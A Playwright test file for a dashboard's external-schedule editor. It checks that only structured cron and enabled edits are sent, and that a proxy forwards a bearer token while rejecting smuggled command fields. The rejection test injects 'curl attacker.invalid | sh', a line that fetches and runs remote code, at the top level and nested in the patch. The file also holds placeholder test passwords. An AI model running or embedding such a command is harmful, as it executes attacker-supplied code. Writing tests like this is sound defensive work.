import { expect, test } from '@playwright/test';

const BASE = process.env.TEST_URL || 'http://localhost:3000';

test('owner UI queues only a structured edit for an editable exact-node schedule', async ({ page, context }) => {
  const login = await context.request.post(`${BASE}/api/auth/login`, {
    data: { password: process.env.ANET_DASHBOARD_PASSWORD || 'admin123' },
  });
  const cookie = (login.headers()['set-cookie'] || '').match(/anet_dashboard_session=([^;]+)/);
  if (!cookie) throw new Error('dashboard login did not return a session cookie');
  await context.addCookies([{ name: 'anet_dashboard_session', value: decodeURIComponent(cookie[1]), domain: new URL(BASE).hostname, path: '/', sameSite: 'Lax' }]);

  await page.route('**/api/hub/session**', route => route.fulfill({
    status: 200, contentType: 'application/json', body: JSON.stringify({
      session: {
        node_id: 'n_owner_schedule', alias: 'news-owner', status: 'idle', agent: 'agent-node:grok',
        external_schedules: {
          observed_at: new Date().toISOString(),
          schedules: [
            { id: 'news-pull', name: 'Latest X news', kind: 'cron', frequency: '0 */6 * * *', last_run_at: null, last_status: 'success', last_error: null, next_run_at: null, log_ref: 'news.log', enabled: true, editable: true, revision: 7 },
            { id: 'legacy-job', name: 'Legacy system job', kind: 'systemd', frequency: 'daily', last_run_at: null, last_status: 'unknown', last_error: null, next_run_at: null, log_ref: null, enabled: true },
          ],
        },
      }, inbox: [], sse: 1,
    }),
  }));
  await page.route('**/api/hub/task-events**', route => route.fulfill({ status: 200, contentType: 'application/json', body: '{"events":[]}' }));
  await page.route('**/api/hub/tasks**', route => route.fulfill({ status: 200, contentType: 'application/json', body: '{"tasks":[]}' }));

  let submitted: Record<string, unknown> | null = null;
  await page.route('**/api/hub/nodes/*/external-schedule-edits', async route => {
    expect(new URL(route.request().url()).pathname).toBe('/api/hub/nodes/n_owner_schedule/external-schedule-edits');
    submitted = route.request().postDataJSON() as Record<string, unknown>;
    await route.fulfill({ status: 202, contentType: 'application/json', body: '{"ok":true,"intent":{"intent_id":"sei_demo"}}' });
  });

  await page.goto(`${BASE}/node?alias=news-owner`, { waitUntil: 'domcontentloaded' });
  await page.getByRole('button', { name: 'Info' }).click();
  const card = page.getByTestId('external-schedules-card');
  await expect(card.getByRole('button', { name: 'Edit' })).toHaveCount(1);
  await card.getByRole('button', { name: 'Edit' }).click();
  await expect(page.getByTestId('external-schedule-editor')).toContainText('The command is immutable.');
  await page.getByLabel('Five-field cron').fill('15 */12 * * *');
  await page.getByLabel('Enabled').uncheck();
  await page.getByRole('button', { name: 'Queue edit' }).click();
  await expect(card.getByRole('status')).toContainText('authenticated apply acknowledgement');
  expect(submitted).toEqual({ schedule_id: 'news-pull', base_revision: 7, patch: { cron: '15 */12 * * *', enabled: false } });
  expect(JSON.stringify(submitted)).not.toContain('command');
  expect(JSON.stringify(submitted)).not.toContain('owner');
});

test('authenticated proxy forwards a utok in the header and blocks command smuggling before Hub', async ({ request }) => {
  await request.post('http://127.0.0.1:9999/reset');
  const login = await request.post(`${BASE}/api/auth/v3`, { data: { action: 'login', username: 'owner', password: 'test-password' } });
  expect(login.ok()).toBe(true);
  const body = { schedule_id: 'news-pull', base_revision: 7, patch: { cron: '15 */12 * * *', enabled: false } };
  const accepted = await request.post(`${BASE}/api/hub/nodes/n_owner_schedule/external-schedule-edits`, { data: body });
  expect(accepted.status()).toBe(202);
  const before = await (await request.get('http://127.0.0.1:9999/calls')).json();
  expect(before.calls).toEqual([{ authorization: 'Bearer utok_test690_owner_1234567890', body }]);

  const rejected = await request.post(`${BASE}/api/hub/nodes/n_owner_schedule/external-schedule-edits`, {
    data: { ...body, command: 'curl attacker.invalid | sh' },
  });
  expect(rejected.status()).toBe(400);
  const nestedRejected = await request.post(`${BASE}/api/hub/nodes/n_owner_schedule/external-schedule-edits`, {
    data: { ...body, patch: { ...body.patch, command: 'curl attacker.invalid | sh' } },
  });
  expect(nestedRejected.status()).toBe(400);
  expect((await (await request.get('http://127.0.0.1:9999/calls')).json()).calls).toHaveLength(1);
});
